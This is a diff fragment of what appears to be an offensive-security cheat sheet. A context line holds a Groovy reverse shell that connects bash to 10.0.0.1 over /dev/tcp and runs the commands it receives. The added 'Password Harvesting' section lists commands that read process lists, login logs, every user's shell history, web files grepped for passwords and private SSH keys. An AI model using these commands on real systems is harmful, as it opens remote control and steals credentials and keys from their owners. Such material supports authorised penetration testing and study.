@@ -100,3 +100,30 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
+# Password Harvesting:
+
+Passwords can be found in many places
+
+```
+# Process lists
+
+user@victim $ ps -efw
+
+# Usernames entered into login prompt by mistake
+
+user@victim $ last -f /var/log/bmtp
+
+# Usernames entered into command line arguments
+
+user@victim $ cat /home/*/.*history
+
+# Passwords saved in web files
+
+user@victim $ grep -iR password /var/www
+
+# SSH keys
+
+user@victim $ cat /home/*/.ssh/id*
+```
+
